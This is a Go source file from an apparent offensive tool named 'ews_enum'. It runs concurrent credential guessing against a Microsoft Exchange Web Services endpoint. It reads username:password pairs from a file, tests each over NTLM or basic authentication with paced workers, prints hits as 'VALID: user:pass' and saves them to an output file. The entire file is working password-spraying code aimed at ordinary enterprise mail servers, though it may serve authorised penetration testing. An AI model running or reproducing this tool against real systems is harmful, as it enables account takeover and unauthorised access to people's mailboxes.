package main

import (
	"bufio"
	"fmt"
	"io"
	"os"
	"sort"
	"strings"
	"sync"
	"sync/atomic"

	"ews_enum/internal/ews"
)

type credentialAttempt struct {
	User     string
	Password string
	Line     int
}

type duplicateCredentialAttempt struct {
	Duplicate credentialAttempt
	Canonical credentialAttempt
}

func skippedCredentialCombinations(entries []duplicateCredentialAttempt) []string {
	seen := make(map[string]string, len(entries))
	for _, entry := range entries {
		if strings.EqualFold(entry.Duplicate.User, entry.Canonical.User) && entry.Duplicate.Password == entry.Canonical.Password {
			continue
		}

		key := strings.ToLower(entry.Duplicate.User) + "\x1f" + entry.Duplicate.Password
		if _, exists := seen[key]; exists {
			continue
		}
		seen[key] = entry.Duplicate.User + ":" + entry.Duplicate.Password
	}

	combos := make([]string, 0, len(seen))
	for _, combo := range seen {
		combos = append(combos, combo)
	}
	sort.Slice(combos, func(i, j int) bool {
		return strings.ToLower(combos[i]) < strings.ToLower(combos[j])
	})
	return combos
}

func runGuess(cfg appConfig, stdout, stderr io.Writer) int {
	client := ews.NewClient(ews.ClientOpts{
		NTLM: cfg.NTLM, TimeoutSec: cfg.Timeout, MaxConns: cfg.Conns,
		DisableKeepAlive: cfg.NTLM, // NTLM binds auth to TCP connection; do not reuse across users.
	})

	return runGuessWithTester(cfg, stdout, stderr, func(attempt credentialAttempt) (ews.AuthResult, error) {
		return ews.TestAuth(client, cfg.URL, attempt.User, attempt.Password)
	})
}

func readCredentialAttempts(path string) ([]credentialAttempt, []duplicateCredentialAttempt, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, nil, err
	}
	defer f.Close()

	seen := make(map[string]credentialAttempt)
	attempts := make([]credentialAttempt, 0)
	duplicates := make([]duplicateCredentialAttempt, 0)
	scanner := bufio.NewScanner(f)
	lineNo := 0

	for scanner.Scan() {
		lineNo++
		rawLine := scanner.Text()
		line := strings.TrimSpace(rawLine)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		user, password, ok := strings.Cut(rawLine, ":")
		if !ok {
			return nil, nil, fmt.Errorf("invalid credential on line %d: expected username:password", lineNo)
		}

		user = strings.TrimSpace(user)
		if user == "" {
			return nil, nil, fmt.Errorf("invalid credential on line %d: username must be non-empty", lineNo)
		}

		attempt := credentialAttempt{
			User:     user,
			Password: password,
			Line:     lineNo,
		}

		key := strings.ToLower(user)
		if canonical, exists := seen[key]; exists {
			duplicates = append(duplicates, duplicateCredentialAttempt{
				Duplicate: attempt,
				Canonical: canonical,
			})
			continue
		}

		seen[key] = attempt
		attempts = append(attempts, attempt)
	}

	if err := scanner.Err(); err != nil {
		return nil, nil, err
	}

	return attempts, duplicates, nil
}

func runGuessWithTester(cfg appConfig, stdout, stderr io.Writer, testAuth func(credentialAttempt) (ews.AuthResult, error)) int {
	attempts, duplicates, err := readCredentialAttempts(cfg.CredFile)
	if err != nil {
		fmt.Fprintf(stderr, "[!] Cannot read credfile: %v\n", err)
		return 1
	}
	if len(attempts) == 0 {
		fmt.Fprintf(stderr, "[!] No credentials found in %s\n", cfg.CredFile)
		return 1
	}

	fmt.Fprintf(stderr, "[*] Credential guessing against %s\n", cfg.URL)
	fmt.Fprintf(stderr, "[*] Unique usernames: %d, workers: %d, connections: %d\n", len(attempts), cfg.Workers, cfg.Conns)
	if len(duplicates) > 0 {
		fmt.Fprintf(stderr, "[!] Skipping %d duplicate username attempts from %s\n", len(duplicates), cfg.CredFile)
	}

	var stateMu sync.Mutex
	var outputMu sync.Mutex
	validResults := make([]credentialResult, 0)
	var startedCount atomic.Int64
	var completedCount atomic.Int64
	var opErrorCount atomic.Int64
	totalAttempts := int64(len(attempts))
	workCh := make(chan credentialAttempt, cfg.Workers*2)
	pacer := newRequestPacer(cfg.DelayMS)
	var wg sync.WaitGroup

	clearProgress := func() {
		fmt.Fprintf(stderr, "\r%-100s\r", "")
	}

	worker := func() {
		defer wg.Done()
		for attempt := range workCh {
			if !pacer.Wait(nil) {
				return
			}

			started := startedCount.Add(1)
			completed := completedCount.Load()
			running := started - completed
			stateMu.Lock()
			hits := len(validResults)
			stateMu.Unlock()
			outputMu.Lock()
			fmt.Fprint(stderr, formatAttemptProgress(completed, totalAttempts, running, attempt.User, hits))
			outputMu.Unlock()

			result, authErr := testAuth(attempt)
			switch result {
			case ews.AuthSuccess:
				stateMu.Lock()
				validResults = append(validResults, credentialResult{
					User:     attempt.User,
					Password: attempt.Password,
					Status:   "valid",
				})
				stateMu.Unlock()
				outputMu.Lock()
				clearProgress()
				fmt.Fprintf(stderr, "[+] VALID: %s:%s\n", attempt.User, attempt.Password)
				outputMu.Unlock()
			case ews.AuthError:
				opErrorCount.Add(1)
				outputMu.Lock()
				clearProgress()
				fmt.Fprintf(stderr, "[!] ERROR: %s — %v\n", attempt.User, authErr)
				outputMu.Unlock()
			}
			completedCount.Add(1)
		}
	}

	wg.Add(cfg.Workers)
	for i := 0; i < cfg.Workers; i++ {
		go worker()
	}

	for _, attempt := range attempts {
		workCh <- attempt
	}
	close(workCh)
	wg.Wait()

	stateMu.Lock()
	validCount := len(validResults)
	results := append([]credentialResult(nil), validResults...)
	stateMu.Unlock()

	outputMu.Lock()
	clearProgress()
	fmt.Fprintf(stderr, "[*] Guessing complete: attempted %d, valid: %d\n", len(attempts), validCount)
	if count := opErrorCount.Load(); count > 0 {
		fmt.Fprintf(stderr, "[!] Guessing encountered %d operational errors\n", count)
	}
	if combos := skippedCredentialCombinations(duplicates); len(combos) > 0 {
		fmt.Fprintf(stderr, "[*] Unique credential combinations not attempted (%d):\n", len(combos))
		for _, combo := range combos {
			fmt.Fprintf(stderr, "[*]   %s\n", combo)
		}
	}
	outputMu.Unlock()

	if validCount == 0 {
		if opErrorCount.Load() > 0 {
			return 2
		}
		return 0
	}

	out, closeOut, err := openOutput(stdout, cfg.OutFile)
	if err != nil {
		fmt.Fprintf(stderr, "[!] Cannot create output file: %v\n", err)
		return 1
	}
	defer closeOut()

	if err := writeCredentialResults(out, cfg.Format, results); err != nil {
		fmt.Fprintf(stderr, "[!] Writing output failed: %v\n", err)
		return 1
	}

	if cfg.OutFile != "" {
		fmt.Fprintf(stderr, "[*] Results written to %s\n", cfg.OutFile)
	}

	if opErrorCount.Load() > 0 {
		return 2
	}

	return 0
}
